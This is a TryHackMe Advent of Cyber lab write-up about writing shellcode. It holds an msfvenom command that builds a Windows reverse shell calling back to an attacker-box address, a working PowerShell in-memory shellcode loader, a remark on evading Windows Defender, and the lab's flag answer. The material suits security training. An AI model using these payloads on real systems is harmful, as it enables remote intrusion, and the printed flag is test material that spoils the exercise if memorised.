# TryHackMe Advent of Cyber - Day 8: Shellcodes of the world, unite!

Glitch, a skilled hacker, was preparing to showcase his shellcode script at a tech conference, unaware that hidden in his home system was a valuable research paper sought by Mayor Malware's henchmen.

---

## Learning Objectives

1. Understand the basics of shellcode writing.
2. Generate shellcode for reverse shells.
3. Execute shellcode using PowerShell.

---

## Essential Terminologies

### Shellcode
- Code injected during exploits (e.g., buffer overflow attacks).
- Often used to execute arbitrary commands or gain control of a machine.
- Typically written in **assembly language**.

### PowerShell
- A Windows scripting language and shell used for automation.
- Exploited by attackers for its deep system access and memory-based script execution.

### Windows Defender
- Built-in security software to detect malicious scripts.
- Bypassed through obfuscation or reflective injection (memory-based execution).

### Windows API
- Provides access to system-level functions like memory management and networking.
- Key functions used in exploitation:
    - `VirtualAlloc`: Allocates memory for shellcode.
    - `CreateThread`: Creates threads to execute shellcode.
    - `WaitForSingleObject`: Pauses execution until a thread finishes.

### Reverse Shell
- A connection initiated by the target system to the attacker’s machine.
- Used to establish remote access.

---

## Generating Shellcode

To generate shellcode for a reverse shell:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell
```
- **Payload**: `windows/x64/shell_reverse_tcp` for a reverse shell on a Windows machine.
- **LHOST**: IP address of the AttackBox.
- **LPORT**: Port listening for the reverse shell (e.g., `1111`).
- **Format**: PowerShell for script execution.

---

## Executing Shellcode

### PowerShell Script
The shellcode is executed using a PowerShell script that:
1. Allocates memory for the shellcode using `VirtualAlloc`.
2. Copies the shellcode into memory.
3. Executes the shellcode using `CreateThread`.
4. Waits for the shellcode to finish using `WaitForSingleObject`.

### Script Example
```powershell
# Define Windows API functions
Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

# Load and execute shellcode
[Byte[]] $buf = SHELLCODE_PLACEHOLDER
[IntPtr]$addr = [WinAPI]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thread = [WinAPI]::CreateThread(0, 0, $addr, 0, 0, 0)
[WinAPI]::WaitForSingleObject($thread, 0xFFFFFFFF)
```

Replace `SHELLCODE_PLACEHOLDER` with the shellcode generated using msfvenom.

---

## Troubleshooting and Updates

### Issue: Altered Shellcode
Mayor Malware’s team tampered with Glitch’s shellcode by modifying the IP and port.

### Solution
1. Identify the tampered shellcode.
2. Update the **IP** to `ATTACKBOX_IP`.
3. Update the **port** to `4444`.
4. Regenerate or manually correct the shellcode.

---

## Conclusion

Glitch’s adventure demonstrates the power of shellcode and the importance of securing critical scripts. Understanding tools like PowerShell and msfvenom helps identify vulnerabilities and defend against exploitation.

---

## Questions

1. What is the flag value once Glitch gets reverse shell on the digital vault using port 4444? Note: The flag may take around a minute to appear in the C:\Users\glitch\Desktop directory. You can view the content of the flag by using the command type C:\Users\glitch\Desktop\flag.txt.
    >AOC{GOT_MY_ACCESS_B@CK007}